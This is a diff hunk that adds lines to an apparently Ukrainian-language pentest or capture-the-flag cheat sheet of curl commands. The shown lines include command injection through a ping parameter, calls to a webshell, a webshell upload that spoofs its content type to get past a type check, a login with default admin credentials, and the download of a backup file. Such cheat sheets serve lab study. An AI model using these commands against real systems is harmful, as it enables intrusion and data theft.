@@ -38,6 +38,13 @@ curl -s "http://$TARGET/ping?ip=127.0.0.1;id"
 curl -G --data-urlencode 'cmd=;id' http://$TARGET/x    # коректне кодування
 # webshell
 curl "http://$TARGET/shell.php?cmd=id"
+# завантажити файл (multipart upload-форма) — залити webshell:
+curl -F 'file=@shell.php' http://$TARGET/upload.php
+curl -F 'file=@shell.php;type=image/jpeg' http://$TARGET/upload.php   # обхід перевірки типу
+# basic-auth / знайдені креди:
+curl -u admin:admin http://$TARGET/admin/
+# забрати файл на локальну машину:
+curl -s http://$TARGET/backup.zip -o backup.zip
 ```
 
 ## Корисне
